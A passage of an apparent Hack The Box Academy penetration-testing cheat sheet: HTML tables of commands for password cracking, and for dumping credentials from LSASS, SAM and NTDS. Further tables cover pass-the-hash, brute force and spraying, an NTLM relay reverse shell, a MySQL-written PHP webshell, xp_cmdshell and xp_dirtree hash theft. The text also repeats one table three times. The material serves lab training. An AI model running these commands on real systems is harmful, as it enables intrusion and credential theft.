style="text-align: left;"><code>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show</code></td>
<td style="text-align: left;">Uses Hashcat to attempt to crack a single
NTLM hash and display the results in the terminal output.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></td>
<td style="text-align: left;">Uses unshadow to combine data from
passwd.bak and shadow.bk into one single file to prepare for
cracking.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code></td>
<td style="text-align: left;">Uses Hashcat in conjunction with a
wordlist to crack the unshadowed hashes and outputs the cracked hashes
to a file called unshadowed.cracked.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code></td>
<td style="text-align: left;">Uses Hashcat in conjunction with a word
list to crack the md5 hashes in the md5-hashes.list file.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</code></td>
<td style="text-align: left;">Uses Hashcat to crack the extracted
BitLocker hashes using a wordlist and outputs the cracked hashes into a
file called backup.cracked.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>ssh2john.pl SSH.private &gt; ssh.hash</code></td>
<td style="text-align: left;">Runs Ssh2john.pl script to generate hashes
for the SSH keys in the SSH.private file, then redirects the hashes to a
file called ssh.hash.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>john ssh.hash --show</code></td>
<td style="text-align: left;">Uses John to attempt to crack the hashes
in the ssh.hash file, then outputs the results in the terminal.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>office2john.py Protected.docx &gt; protected-docx.hash</code></td>
<td style="text-align: left;">Runs Office2john.py against a protected
.docx file and converts it to a hash stored in a file called
protected-docx.hash.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>john --wordlist=rockyou.txt protected-docx.hash</code></td>
<td style="text-align: left;">Uses John in conjunction with the wordlist
rockyou.txt to crack the hash protected-docx.hash.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>pdf2john.pl PDF.pdf &gt; pdf.hash</code></td>
<td style="text-align: left;">Runs Pdf2john.pl script to convert a pdf
file to a pdf has to be cracked.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>john --wordlist=rockyou.txt pdf.hash</code></td>
<td style="text-align: left;">Runs John in conjunction with a wordlist
to crack a pdf hash.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>zip2john ZIP.zip &gt; zip.hash</code></td>
<td style="text-align: left;">Runs Zip2john against a zip file to
generate a hash, then adds that hash to a file called zip.hash.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>john --wordlist=rockyou.txt zip.hash</code></td>
<td style="text-align: left;">Uses John in conjunction with a wordlist
to crack the hashes contained in zip.hash.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>bitlocker2john -i Backup.vhd &gt; backup.hashes</code></td>
<td style="text-align: left;">Uses Bitlocker2john script to extract
hashes from a VHD file and directs the output to a file called
backup.hashes.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>file GZIP.gzip</code></td>
<td style="text-align: left;">Uses the Linux-based file tool to gather
file format information.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null \| tar xz;done</code></td>
<td style="text-align: left;">Script that runs a for-loop to extract
files from an archive.</td>
</tr>
</tbody>
</table>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 78%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;"><strong>Command</strong></th>
<th style="text-align: left;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td
style="text-align: left;"><code>xfreerdp /v:&lt;ip&gt; /u:htb-student /p:HTB_@cademy_stdnt!</code></td>
<td style="text-align: left;">CLI-based tool used to connect to a
Windows target using the Remote Desktop Protocol.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>evil-winrm -i &lt;ip&gt; -u user -p password</code></td>
<td style="text-align: left;">Uses Evil-WinRM to establish a Powershell
session with a target.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>ssh user@&lt;ip&gt;</code></td>
<td style="text-align: left;">Uses SSH to connect to a target using a
specified user.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>smbclient -U user \\\\&lt;ip&gt;\\SHARENAME</code></td>
<td style="text-align: left;">Uses smbclient to connect to an SMB share
using a specified user.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>python3 smbserver.py -smb2support CompData /home/&lt;nameofuser&gt;/Documents/</code></td>
<td style="text-align: left;">Uses smbserver.py to create a share on a
linux-based attack host. Can be useful when needing to transfer files
from a target to an attack host.</td>
</tr>
</tbody>
</table>
<h4 id="password-mutations">Password Mutations</h4>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 78%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;"><strong>Command</strong></th>
<th style="text-align: left;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td
style="text-align: left;"><code>cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></td>
<td style="text-align: left;">Uses cewl to generate a wordlist based on
keywords present on a website.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>hashcat --force password.list -r custom.rule --stdout &gt; mut_password.list</code></td>
<td style="text-align: left;">Uses Hashcat to generate a rule-based word
list.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>./username-anarchy -i /path/to/listoffirstandlastnames.txt</code></td>
<td style="text-align: left;">Users username-anarchy tool in conjunction
with a pre-made list of first and last names to generate a list of
potential username.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt</code></td>
<td style="text-align: left;">Uses Linux-based commands curl, awk, grep
and tee to download a list of file extensions to be used in searching
for files that could contain passwords.</td>
</tr>
</tbody>
</table>
<h4 id="remote-password-attacks">Remote Password Attacks</h4>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 78%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;"><strong>Command</strong></th>
<th style="text-align: left;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td
style="text-align: left;"><code>crackmapexec winrm &lt;ip&gt; -u user.list -p password.list</code></td>
<td style="text-align: left;">Uses CrackMapExec over WinRM to attempt to
brute force user names and passwords specified hosted on a target.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>crackmapexec smb &lt;ip&gt; -u "user" -p "password" --shares</code></td>
<td style="text-align: left;">Uses CrackMapExec to enumerate smb shares
on a target using a specified set of credentials.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>hydra -L user.list -P password.list &lt;service&gt;://&lt;ip&gt;</code></td>
<td style="text-align: left;">Uses Hydra in conjunction with a user list
and password list to attempt to crack a password over the specified
service.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>hydra -l username -P password.list &lt;service&gt;://&lt;ip&gt;</code></td>
<td style="text-align: left;">Uses Hydra in conjunction with a username
and password list to attempt to crack a password over the specified
service.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>hydra -l user.list -p password &lt;service&gt;://&lt;ip&gt;</code></td>
<td style="text-align: left;">Uses Hydra in conjunction with a user list
and password to attempt to crack a password over the specified
service.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>hydra -C &lt;user_pass.list&gt; ssh://&lt;IP&gt;</code></td>
<td style="text-align: left;">Uses Hydra in conjunction with a list of
credentials to attempt to login to a target over the specified service.
This can be used to attempt a credential stuffing attack.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam</code></td>
<td style="text-align: left;">Uses CrackMapExec in conjunction with
admin credentials to dump password hashes stored in SAM, over the
network.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa</code></td>
<td style="text-align: left;">Uses CrackMapExec in conjunction with
admin credentials to dump lsa secrets, over the network. It is possible
to get clear-text credentials this way.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>crackmapexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds</code></td>
<td style="text-align: left;">Uses CrackMapExec in conjunction with
admin credentials to dump hashes from the ntds file over a network.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>evil-winrm -i &lt;ip&gt;  -u  Administrator -H "&lt;passwordhash&gt;"</code></td>
<td style="text-align: left;">Uses Evil-WinRM to establish a Powershell
session with a Windows target using a user and password hash. This is
one type of <code>Pass-The-Hash</code> attack.</td>
</tr>
</tbody>
</table>
<h4 id="windows-local-password-attacks">Windows Local Password
Attacks</h4>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 78%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;"><strong>Command</strong></th>
<th style="text-align: left;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><code>tasklist /svc</code></td>
<td style="text-align: left;">A command-line-based utility in Windows
used to list running processes.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></td>
<td style="text-align: left;">Uses Windows command-line based utility
findstr to search for the string “password” in many different file
type.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>Get-Process lsass</code></td>
<td style="text-align: left;">A Powershell cmdlet is used to display
process information. Using this with the LSASS process can be helpful
when attempting to dump LSASS process memory from the command line.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></td>
<td style="text-align: left;">Uses rundll32 in Windows to create a LSASS
memory dump file. This file can then be transferred to an attack box to
extract credentials.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>pypykatz lsa minidump /path/to/lsassdumpfile</code></td>
<td style="text-align: left;">Uses Pypykatz to parse and attempt to
extract credentials &amp; password hashes from an LSASS process memory
dump file.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>reg.exe save hklm\sam C:\sam.save</code></td>
<td style="text-align: left;">Uses reg.exe in Windows to save a copy of
a registry hive at a specified location on the file system. It can be
used to make copies of any registry hive (i.e., hklm, hklm, hklm).</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>move sam.save \\&lt;ip&gt;\NameofFileShare</code></td>
<td style="text-align: left;">Uses move in Windows to transfer a file to
a specified file share over the network.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></td>
<td style="text-align: left;">Uses Secretsdump.py to dump password
hashes from the SAM database.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>vssadmin CREATE SHADOW /For=C:</code></td>
<td style="text-align: left;">Uses Windows command line based tool
vssadmin to create a volume shadow copy for <code>C:</code>. This can be
used to make a copy of NTDS.dit safely.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</code></td>
<td style="text-align: left;">Uses Windows command line based tool copy
to create a copy of NTDS.dit for a volume shadow copy of
<code>C:</code>.</td>
</tr>
</tbody>
</table>
<h4 id="linux-local-password-attacks">Linux Local Password Attacks</h4>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 78%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;"><strong>Command</strong></th>
<th style="text-align: left;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td
style="text-align: left;"><code>hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt</code></td>
<td style="text-align: left;">Uses Hashcat to crack NTLM hashes using a
specified wordlist.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show</code></td>
<td style="text-align: left;">Uses Hashcat to attempt to crack a single
NTLM hash and display the results in the terminal output.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></td>
<td style="text-align: left;">Uses unshadow to combine data from
passwd.bak and shadow.bk into one single file to prepare for
cracking.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code></td>
<td style="text-align: left;">Uses Hashcat in conjunction with a
wordlist to crack the unshadowed hashes and outputs the cracked hashes
to a file called unshadowed.cracked.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code></td>
<td style="text-align: left;">Uses Hashcat in conjunction with a word
list to crack the md5 hashes in the md5-hashes.list file.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</code></td>
<td style="text-align: left;">Uses Hashcat to crack the extracted
BitLocker hashes using a wordlist and outputs the cracked hashes into a
file called backup.cracked.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>ssh2john.pl SSH.private &gt; ssh.hash</code></td>
<td style="text-align: left;">Runs Ssh2john.pl script to generate hashes
for the SSH keys in the SSH.private file, then redirects the hashes to a
file called ssh.hash.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>john ssh.hash --show</code></td>
<td style="text-align: left;">Uses John to attempt to crack the hashes
in the ssh.hash file, then outputs the results in the terminal.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>office2john.py Protected.docx &gt; protected-docx.hash</code></td>
<td style="text-align: left;">Runs Office2john.py against a protected
.docx file and converts it to a hash stored in a file called
protected-docx.hash.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>john --wordlist=rockyou.txt protected-docx.hash</code></td>
<td style="text-align: left;">Uses John in conjunction with the wordlist
rockyou.txt to crack the hash protected-docx.hash.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>pdf2john.pl PDF.pdf &gt; pdf.hash</code></td>
<td style="text-align: left;">Runs Pdf2john.pl script to convert a pdf
file to a pdf has to be cracked.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>john --wordlist=rockyou.txt pdf.hash</code></td>
<td style="text-align: left;">Runs John in conjunction with a wordlist
to crack a pdf hash.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>zip2john ZIP.zip &gt; zip.hash</code></td>
<td style="text-align: left;">Runs Zip2john against a zip file to
generate a hash, then adds that hash to a file called zip.hash.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>john --wordlist=rockyou.txt zip.hash</code></td>
<td style="text-align: left;">Uses John in conjunction with a wordlist
to crack the hashes contained in zip.hash.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>bitlocker2john -i Backup.vhd &gt; backup.hashes</code></td>
<td style="text-align: left;">Uses Bitlocker2john script to extract
hashes from a VHD file and directs the output to a file called
backup.hashes.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>file GZIP.gzip</code></td>
<td style="text-align: left;">Uses the Linux-based file tool to gather
file format information.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null \| tar xz;done</code></td>
<td style="text-align: left;">Script that runs a for-loop to extract
files from an archive.</td>
</tr>
</tbody>
</table>
<h4 id="cracking-passwords">Cracking Passwords</h4>
<table>
<colgroup>
<col style="width: 19%" />
<col style="width: 80%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt</code></td>
<td>Uses Hashcat to crack NTLM hashes using a specified wordlist.</td>
</tr>
<tr class="even">
<td><code>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show</code></td>
<td>Uses Hashcat to attempt to crack a single NTLM hash and display the
results in the terminal output.</td>
</tr>
<tr class="odd">
<td><code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></td>
<td>Uses unshadow to combine data from passwd.bak and shadow.bk into one
single file to prepare for cracking.</td>
</tr>
<tr class="even">
<td><code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code></td>
<td>Uses Hashcat in conjunction with a wordlist to crack the unshadowed
hashes and outputs the cracked hashes to a file called
unshadowed.cracked.</td>
</tr>
<tr class="odd">
<td><code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code></td>
<td>Uses Hashcat in conjunction with a word list to crack the md5 hashes
in the md5-hashes.list file.</td>
</tr>
<tr class="even">
<td><code>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</code></td>
<td>Uses Hashcat to crack the extracted BitLocker hashes using a
wordlist and outputs the cracked hashes into a file called
backup.cracked.</td>
</tr>
<tr class="odd">
<td><code>ssh2john.pl SSH.private &gt; ssh.hash</code></td>
<td>Runs Ssh2john.pl script to generate hashes for the SSH keys in the
SSH.private file, then redirects the hashes to a file called
ssh.hash.</td>
</tr>
<tr class="even">
<td><code>john ssh.hash --show</code></td>
<td>Uses John to attempt to crack the hashes in the ssh.hash file, then
outputs the results in the terminal.</td>
</tr>
<tr class="odd">
<td><code>office2john.py Protected.docx &gt; protected-docx.hash</code></td>
<td>Runs Office2john.py against a protected .docx file and converts it
to a hash stored in a file called protected-docx.hash.</td>
</tr>
<tr class="even">
<td><code>john --wordlist=rockyou.txt protected-docx.hash</code></td>
<td>Uses John in conjunction with the wordlist rockyou.txt to crack the
hash protected-docx.hash.</td>
</tr>
<tr class="odd">
<td><code>pdf2john.pl PDF.pdf &gt; pdf.hash</code></td>
<td>Runs Pdf2john.pl script to convert a pdf file to a pdf has to be
cracked.</td>
</tr>
<tr class="even">
<td><code>john --wordlist=rockyou.txt pdf.hash</code></td>
<td>Runs John in conjunction with a wordlist to crack a pdf hash.</td>
</tr>
<tr class="odd">
<td><code>zip2john ZIP.zip &gt; zip.hash</code></td>
<td>Runs Zip2john against a zip file to generate a hash, then adds that
hash to a file called zip.hash.</td>
</tr>
<tr class="even">
<td><code>john --wordlist=rockyou.txt zip.hash</code></td>
<td>Uses John in conjunction with a wordlist to crack the hashes
contained in zip.hash.</td>
</tr>
<tr class="odd">
<td><code>bitlocker2john -i Backup.vhd &gt; backup.hashes</code></td>
<td>Uses Bitlocker2john script to extract hashes from a VHD file and
directs the output to a file called backup.hashes.</td>
</tr>
<tr class="even">
<td><code>file GZIP.gzip</code></td>
<td>Uses the Linux-based file tool to gather file format
information.</td>
</tr>
<tr class="odd">
<td><code>for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null \| tar xz;done</code></td>
<td>Script that runs a for-loop to extract files from an archive.</td>
</tr>
</tbody>
</table>
<p><a id="11-attacking-common-services"></a> ### 11. Attacking Common
Services</p>
<h4 id="attacking-ftp">Attacking FTP</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>ftp 192.168.2.142</code></td>
<td>Connecting to the FTP server using the <code>ftp</code> client.</td>
</tr>
<tr class="even">
<td><code>nc -v 192.168.2.142 21</code></td>
<td>Connecting to the FTP server using <code>netcat</code>.</td>
</tr>
<tr class="odd">
<td><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td>
<td>Brute-forcing the FTP service.</td>
</tr>
</tbody>
</table>
<h4 id="attacking-smb">Attacking SMB</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>smbclient -N -L //10.129.14.128</code></td>
<td>Null-session testing against the SMB service.</td>
</tr>
<tr class="even">
<td><code>smbmap -H 10.129.14.128</code></td>
<td>Network share enumeration using <code>smbmap</code>.</td>
</tr>
<tr class="odd">
<td><code>smbmap -H 10.129.14.128 -r notes</code></td>
<td>Recursive network share enumeration using <code>smbmap</code>.</td>
</tr>
<tr class="even">
<td><code>smbmap -H 10.129.14.128 --download "notes\note.txt"</code></td>
<td>Download a specific file from the shared folder.</td>
</tr>
<tr class="odd">
<td><code>smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"</code></td>
<td>Upload a specific file to the shared folder.</td>
</tr>
<tr class="even">
<td><code>rpcclient -U'%' 10.10.110.17</code></td>
<td>Null-session with the <code>rpcclient</code>.</td>
</tr>
<tr class="odd">
<td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td>
<td>Automated enumeratition of the SMB service using
<code>enum4linux-ng</code>.</td>
</tr>
<tr class="even">
<td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'</code></td>
<td>Password spraying against different users from a list.</td>
</tr>
<tr class="odd">
<td><code>impacket-psexec administrator:'Password123!'@10.10.110.17</code></td>
<td>Connect to the SMB service using the
<code>impacket-psexec</code>.</td>
</tr>
<tr class="even">
<td><code>crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</code></td>
<td>Execute a command over the SMB service using
<code>crackmapexec</code>.</td>
</tr>
<tr class="odd">
<td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</code></td>
<td>Enumerating Logged-on users.</td>
</tr>
<tr class="even">
<td><code>crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</code></td>
<td>Extract hashes from the SAM database.</td>
</tr>
<tr class="odd">
<td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td>
<td>Use the Pass-The-Hash technique to authenticate on the target
host.</td>
</tr>
<tr class="even">
<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td>
<td>Dump the SAM database using <code>impacket-ntlmrelayx</code>.</td>
</tr>
<tr class="odd">
<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;base64 reverse shell&gt;</code></td>
<td>Execute a PowerShell based reverse shell using
<code>impacket-ntlmrelayx</code>.</td>
</tr>
</tbody>
</table>
<h4 id="attacking-sql-databases">Attacking SQL Databases</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td>
<td>Connecting to the MySQL server.</td>
</tr>
<tr class="even">
<td><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30</code></td>
<td>Connecting to the MSSQL server.</td>
</tr>
<tr class="odd">
<td><code>sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h</code></td>
<td>Connecting to the MSSQL server from Linux.</td>
</tr>
<tr class="even">
<td><code>sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h</code></td>
<td>Connecting to the MSSQL server from Linux while Windows
Authentication mechanism is used by the MSSQL server.</td>
</tr>
<tr class="odd">
<td><code>mysql&gt; SHOW DATABASES;</code></td>
<td>Show all available databases in MySQL.</td>
</tr>
<tr class="even">
<td><code>mysql&gt; USE htbusers;</code></td>
<td>Select a specific database in MySQL.</td>
</tr>
<tr class="odd">
<td><code>mysql&gt; SHOW TABLES;</code></td>
<td>Show all available tables in the selected database in MySQL.</td>
</tr>
<tr class="even">
<td><code>mysql&gt; SELECT * FROM users;</code></td>
<td>Select all available entries from the “users” table in MySQL.</td>
</tr>
<tr class="odd">
<td><code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code></td>
<td>Show all available databases in MSSQL.</td>
</tr>
<tr class="even">
<td><code>sqlcmd&gt; USE htbusers</code></td>
<td>Select a specific database in MSSQL.</td>
</tr>
<tr class="odd">
<td><code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td>
<td>Show all available tables in the selected database in MSSQL.</td>
</tr>
<tr class="even">
<td><code>sqlcmd&gt; SELECT * FROM users</code></td>
<td>Select all available entries from the “users” table in MSSQL.</td>
</tr>
<tr class="odd">
<td><code>sqlcmd&gt; EXECUTE sp_configure 'show advanced options', 1</code></td>
<td>To allow advanced options to be changed.</td>
</tr>
<tr class="even">
<td><code>sqlcmd&gt; EXECUTE sp_configure 'xp_cmdshell', 1</code></td>
<td>To enable the xp_cmdshell.</td>
</tr>
<tr class="odd">
<td><code>sqlcmd&gt; RECONFIGURE</code></td>
<td>To be used after each sp_configure command to apply the
changes.</td>
</tr>
<tr class="even">
<td><code>sqlcmd&gt; xp_cmdshell 'whoami'</code></td>
<td>Execute a system command from MSSQL server.</td>
</tr>
<tr class="odd">
<td><code>mysql&gt; SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php'</code></td>
<td>Create a file using MySQL.</td>
</tr>
<tr class="even">
<td><code>mysql&gt; show variables like "secure_file_priv";</code></td>
<td>Check if the the secure file privileges are empty to read locally
stored files on the system.</td>
</tr>
<tr class="odd">
<td><code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents</code></td>
<td>Read local files in MSSQL.</td>
</tr>
<tr class="even">
<td><code>mysql&gt; select LOAD_FILE("/etc/passwd");</code></td>
<td>Read local files in MySQL.</td>
</tr>
<tr class="odd">
<td><code>sqlcmd&gt; EXEC master..xp_dirtree '\\10.10.110.17\share\'</code></td>
<td>Hash stealing using the <code>xp_dirtree</code> command in
MSSQL.</td>
</tr>
<tr class="even">
<td><code>sqlcmd&gt; EXEC master..xp_subdirs '\\10.10.110.17\share\'</code></td>
<td>Hash stealing using the <code>xp_subdirs</code> command in
MSSQL.</td>
</tr>
<tr class="odd">
<td><code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code></td>
<td>Identify linked servers in MSSQL.</td>
</tr>
<tr class="even">
<td><code>sqlcmd&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]</code></td>
<td>Identify the user and its privileges used for the remote connection
in MSSQL.</td>
</tr>
</tbody>
</table>
<h4 id="attacking-rdp">Attacking RDP</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'</code></td>
<td>Password spraying against the RDP service.</td>
</tr>
<tr class="even">
<td><code>hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code></td>
<td>Brute-forcing the RDP service.</td>
</tr>
<tr class="odd">
<td><code>rdesktop -u admin -p password123 192.168.2.143</code></td>
<td>Connect to the RDP service using <code>rdesktop</code> in
Linux.</td>
</tr>
<tr class="even">
<td><code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code></td>
<td>Impersonate a user without its password.</td>
</tr>
<tr class="odd">
<td><code>net start sessionhijack</code></td>
<td>Execute the RDP session hijack.</td>
</tr>
<tr class="even">
<td><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td>
<td>Enable “Restricted Admin Mode” on the target Windows host.</td>
</tr>
<tr class="odd">
<td><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td>
<td>Use the Pass-The-Hash technique to login on the target host without
a password.</td>
</tr>
</tbody>
</table>
<h4 id="attacking-dns">Attacking DNS</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td>
<td>Perform an AXFR zone transfer attempt against a specific name
server.</td>
</tr>
<tr class="even">
<td><code>subfinder -d inlanefreight.com -v</code></td>
<td>Brute-forcing subdomains.</td>
</tr>
<tr class="odd">
<td><code>host support.inlanefreight.com</code></td>
<td>DNS lookup for the specified subdomain.</td>
</tr>
</tbody>
</table>
<h4 id="attacking-email-services">Attacking Email Services</h4>
<table>
<colgroup>
